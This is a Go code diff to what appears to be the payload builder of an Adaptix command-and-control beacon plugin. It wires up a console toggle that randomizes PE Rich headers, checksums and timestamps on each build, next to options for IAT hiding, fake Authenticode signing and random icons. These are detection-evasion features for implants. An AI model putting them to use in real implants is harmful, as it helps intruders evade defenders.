@@ -368,6 +368,9 @@ type GenerateConfig struct {
 	IconContent        string `json:"icon_content" ax:"label=ICO 文件;group=图标与侧载;file=.ico;showif=format:Exe,Service Exe,DLL;hint=留空 = 用默认图标；与「随机 ICO」同时勾选时以随机为准"`
 	IconRandom         bool   `json:"icon_random" ax:"label=随机生成 ICO;group=图标与侧载;showif=format:Exe,Service Exe,DLL;order=-1"`
 	ExePseudoSign      bool   `json:"exe_pseudo_sign" ax:"label=Exe 伪 Authenticode 签名;group=进程与签名;showif=format:Exe,Service Exe;hint=随机自签名；服务端缺 openssl/osslsigncode 时跳过并记构建日志，不失败"`
+	// nil / 省略 ⇒ 跟随 buildenv.mk 的 BEACON_PE_HEADER_MOD（当前 := true）；
+	// 控制台显式勾选/取消则以控制台为准。三种取值语义见 effectivePeHeaderMod()。
+	PeHeaderMod *bool `json:"pe_header_mod" ax:"label=PE Header 改写（Rich header）;group=进程与签名;showif=format:Exe,Service Exe,DLL;hint=默认跟随 buildenv.mk 的 BEACON_PE_HEADER_MOD=true；用 pe_header_mod.py 覆写 Rich header，做 per-build 多样化"`
 	DnsResolvers       string `json:"dns_resolvers" ax:"label=DNS 解析器;group=DNS;showif=listener:BeaconDNS;hint=逗号分隔；留空则用监听器上的 resolvers（pl_utils.go:483）"`
 	DohResolvers       string `json:"doh_resolvers" ax:"label=DoH 解析器;group=DNS;showif=listener:BeaconDNS;hint=逗号分隔；留空则用插件内置默认（pl_utils.go:488）"`
 	DnsMode            string `json:"dns_mode" ax:"label=DNS 模式;group=DNS;showif=listener:BeaconDNS;order=-1"`
@@ -407,6 +410,24 @@ func (c GenerateConfig) effectiveIatHiding() bool {
 		return buildEnv["BEACON_IAT_HIDING_DEFAULT"] == "true"
 	}
 	return *c.IatHiding
+}
+
+// effectivePeHeaderMod 决出这次构建要不要跑 pe_header_mod.py（L4 PE 头改写：
+// Rich header 注入 + 校验和 + 时间戳随机化，做 per-build 多样化）。
+//
+// ★ 在补上它之前，ax_config.axs 的 GenerateUI（:653 container.put("pe_header_mod", …)）
+//   和 Web 的 BuildSchema 都在往 config 里填这个键，而这里**没有任何地方读它** ——
+//   控制台的勾选框是惰性的，永远只看 buildenv.mk。与 ExePseudoSign 是同一个坑。
+func (c GenerateConfig) effectivePeHeaderMod() bool {
+	if c.PeHeaderMod == nil {
+		return buildEnv["BEACON_PE_HEADER_MOD"] == "true"
+	}
+	return *c.PeHeaderMod
+}
+
+// peFormat 只对有 PE 头的产物成立（Shellcode / Hex C 没有头可改）。
+func (c GenerateConfig) peFormat() bool {
+	return c.Format == "Exe" || c.Format == "Service Exe" || c.Format == "DLL"
 }
 
 // resolveLinkerLd locates the GNU ld script for IAT-hidden Exe/Service links.
@@ -1310,10 +1331,11 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		_ = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", stripCmd)
 	}
 
-	// L4 PE post-processing (buildenv.mk: BEACON_PE_HEADER_MOD + BEACON_PE_MOD_FLAGS):
-	// inject a valid MSVC Rich header, write a correct checksum, randomize
-	// timestamp. Skipped for Shellcode/Hex C (no PE header in the final artifact).
-	if buildEnv["BEACON_PE_HEADER_MOD"] == "true" && (generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe" || generateConfig.Format == "DLL") {
+	// L4 PE post-processing (BEACON_PE_MOD_FLAGS): inject a valid MSVC Rich header,
+	// write a correct checksum, randomize timestamp.
+	// 开关：控制台显式勾选/取消优先，nil 时回落到 buildenv.mk 的 BEACON_PE_HEADER_MOD。
+	// 只对有 PE 头的产物生效（Shellcode / Hex C 没有头可改）。
+	if generateConfig.effectivePeHeaderMod() && generateConfig.peFormat() {
 		peModPath, _ := filepath.Abs(filepath.Join(ModuleDir, "pe_header_mod.py"))
 		if _, err := os.Stat(peModPath); err == nil {
 			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Applying PE header modifications (Rich header injection + normalization)...")
